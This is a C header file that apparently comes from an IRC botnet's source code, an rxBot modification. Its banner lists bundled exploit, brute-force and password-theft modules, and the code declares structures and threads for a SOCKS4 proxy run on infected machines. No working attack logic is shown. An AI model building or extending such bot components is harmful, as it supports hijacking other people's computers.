/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_BIND 2
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91
#define SOCKS4_REJECT_IDENTD 92
#define SOCKS4_REJECT_USERID 93

// socks4 daemon structure.
typedef struct SOCKS4HEADER 
{
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];

} SOCKS4HEADER;

typedef struct SOCKS4 
{
	SOCKET sock;
	char chan[128];
	char userid[16];
	int port;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} SOCKS4;

 
DWORD WINAPI Socks4Thread(LPVOID param);
DWORD WINAPI Socks4ClientThread(LPVOID param);
void TransferLoop(SOCKET tsock, SOCKET csock);
#endif
